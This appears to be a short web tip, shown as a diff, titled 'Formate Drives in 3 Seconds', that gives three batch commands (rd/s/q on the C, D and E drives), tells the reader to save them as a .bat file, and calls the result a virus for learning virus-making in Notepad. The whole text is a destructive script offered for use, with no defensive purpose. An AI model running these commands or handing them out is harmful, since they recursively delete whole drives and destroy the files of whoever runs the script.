@@ -1,0 +1,12 @@
+Formate Drives in 3 Seconds
+
+
+“rd/s/q D:
+
+rd/s/q C:
+
+rd/s/q E:” ( without quotes )
+
+Save as “anything.bat
+
+This virus Formats the C ,D , and E Drive in 3 Seconds. This is a very useful script if you want to learn how to create a virus using notepad.
